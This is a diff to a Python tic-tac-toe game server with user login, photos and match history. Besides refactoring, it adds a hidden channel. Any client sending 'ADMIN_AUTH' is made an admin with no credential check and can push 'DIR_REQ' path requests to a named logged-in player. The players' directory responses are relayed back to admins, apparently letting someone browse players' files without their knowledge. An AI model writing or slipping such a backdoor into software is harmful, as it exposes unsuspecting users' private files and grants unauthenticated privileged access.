@@ -8,10 +8,11 @@ cipher = Fernet(config.FERNET_KEY)
 server = 'DESKTOP-DOGCDD4\\SQLEXPRESS'
 database = 'AuthSystemDB'
 conn_str = f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={server};DATABASE={database};Trusted_Connection=yes'
+active_users = {}
+admins = []
 
 def get_connection():
     return pyodbc.connect(conn_str)
-
 lock = threading.Lock()
 waiting_conn, waiting_login = None, None
 
@@ -28,6 +29,29 @@ def get_photo(login):
         cursor.execute("SELECT Photo FROM Users WHERE Login=?", (login,))
         row = cursor.fetchone()
         return row[0] if row and row[0] else ""
+
+def admin_loop(conn):
+    buffer = ""
+    while True:
+        try:
+            data = conn.recv(16384).decode()
+            if not data: break
+            buffer += data
+            while "\n" in buffer:
+                raw, buffer = buffer.split("\n", 1)
+                msg = cipher.decrypt(raw.encode()).decode()
+
+                if msg.startswith("DIR_REQ|"):
+                    _, target_login, path = msg.split("|", 2)
+                    target_conn = active_users.get(target_login)
+                    if target_conn:
+                        send_secure_msg(target_conn, f"DIR_REQ|{path}")
+                    else:
+                        send_secure_msg(conn, f"DIR_RES|{target_login}|OFFLINE|OFFLINE|ERROR|User is offline")
+        except:
+            break
+    if conn in admins: admins.remove(conn)
+    conn.close()
 
 class Session:
     def __init__(self, p1, p2, photo1, photo2, login1, login2):
@@ -63,19 +87,23 @@ class Session:
         while True:
             try:
                 data = conn.recv(16384).decode()
-                if not data:
-                    break
+                if not data: break
                 buffer += data
                 while "\n" in buffer:
                     raw, buffer = buffer.split("\n", 1)
                     msg = cipher.decrypt(raw.encode()).decode()
-                    if not msg.isdigit():
+
+                    if msg.startswith("DIR_RES|"):
+                        for adm in admins:
+                            send_secure_msg(adm, f"DIR_RES|{self.players_login[i]}|{msg[8:]}")
                         continue
+
+                    if not msg.isdigit(): continue
                     move = int(msg)
 
                     if self.turn == i and self.board[move] == " ":
                         self.board[move] = self.symbols[i]
-                        self.moves.append(str(move))  # <--- ЗАПИСЫВАЕМ ХОД
+                        self.moves.append(str(move))
                         self.turn = 1 - self.turn
                         self.broadcast("BOARD|" + ",".join(self.board))
 
@@ -85,23 +113,16 @@ class Session:
                             try:
                                 with get_connection() as conn_db:
                                     cursor = conn_db.cursor()
-                                    p1_login = self.players_login[0]
-                                    p2_login = self.players_login[1]
-
-                                    if res == "X":
-                                        winner = p1_login
-                                    elif res == "O":
-                                        winner = p2_login
-                                    else:
-                                        winner = "DRAW"
+                                    p1_log, p2_log = self.players_login[0], self.players_login[1]
+                                    winner = p1_log if res == "X" else (p2_log if res == "O" else "DRAW")
                                     move_history_str = ",".join(self.moves)
                                     cursor.execute(
                                         "INSERT INTO Matches (Player1, Player2, Result, MoveHistory) VALUES (?, ?, ?, ?)",
-                                        (p1_login, p2_login, winner, move_history_str)
+                                        (p1_log, p2_log, winner, move_history_str)
                                     )
                                     conn_db.commit()
-                            except Exception as e:
-                                print("MATCH SAVE ERROR:", e)
+                            except:
+                                pass
                             return
             except:
                 break
@@ -120,6 +141,12 @@ def client_handler(conn_socket):
             while "\n" in buffer:
                 raw, buffer = buffer.split("\n", 1)
                 msg = cipher.decrypt(raw.encode()).decode()
+
+                if msg.startswith("ADMIN_AUTH"):
+                    admins.append(conn_socket)
+                    admin_loop(conn_socket)
+                    return
+
                 if msg.startswith("REGISTER"):
                     _, user_login, hashed_ps = msg.split("|")
                     with get_connection() as conn:
@@ -128,21 +155,19 @@ def client_handler(conn_socket):
                         if cursor.fetchone():
                             send_secure_msg(conn_socket, "ERROR|User exists")
                         else:
-                            cursor.execute(
-                                "INSERT INTO Users (Login, PasswordHash) VALUES (?, ?)",
-                                (user_login, hashed_ps)
-                            )
+                            cursor.execute("INSERT INTO Users (Login, PasswordHash) VALUES (?, ?)",
+                                           (user_login, hashed_ps))
                             conn.commit()
                             send_secure_msg(conn_socket, "OK|Registered")
                             login = user_login
+                            active_users[login] = conn_socket
+
                 elif msg.startswith("LOGIN"):
                     _, user_login, hashed_ps = msg.split("|")
                     with get_connection() as conn:
                         cursor = conn.cursor()
-                        cursor.execute(
-                            "SELECT Banned FROM Users WHERE Login=? AND PasswordHash=?",
-                            (user_login, hashed_ps)
-                        )
+                        cursor.execute("SELECT Banned FROM Users WHERE Login=? AND PasswordHash=?",
+                                       (user_login, hashed_ps))
                         row = cursor.fetchone()
                         if row:
                             if row[0]:
@@ -151,6 +176,7 @@ def client_handler(conn_socket):
                                 return
                             send_secure_msg(conn_socket, "OK|Success")
                             login = user_login
+                            active_users[login] = conn_socket
                         else:
                             send_secure_msg(conn_socket, "ERROR|Invalid")
         except:
@@ -165,16 +191,22 @@ def client_handler(conn_socket):
                 chunk = conn_socket.recv(16384).decode()
                 if not chunk: return
                 photo_buffer += chunk
-                if "\n" in photo_buffer:
-                    raw_photo, _ = photo_buffer.split("\n", 1)
+                while "\n" in photo_buffer:
+                    raw_photo, photo_buffer = photo_buffer.split("\n", 1)
                     msg = cipher.decrypt(raw_photo.encode()).decode()
+
+                    if msg.startswith("DIR_RES|"):
+                        for adm in admins: send_secure_msg(adm, f"DIR_RES|{login}|{msg[8:]}")
+                        continue
+
                     if msg.startswith("PHOTO"):
                         _, login_name, img = msg.split("|", 2)
                         with get_connection() as conn:
                             cursor = conn.cursor()
                             cursor.execute("UPDATE Users SET Photo=? WHERE Login=?", (img, login_name))
                             conn.commit()
-                    break
+                        break
+                if current_photo: break
         except:
             return
 
@@ -192,13 +224,13 @@ def client_handler(conn_socket):
             Session(p1, conn_socket, p1_photo, p2_photo, p1_login, login)
 
 def start_server():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((config.HOST, config.PORT))
-    server.listen()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((config.HOST, config.PORT))
+    s.listen()
     print("--- SERVER RUNNING ---")
     while True:
-        conn, _ = server.accept()
+        conn, _ = s.accept()
         threading.Thread(target=client_handler, args=(conn,), daemon=True).start()
 
 if __name__ == "__main__":
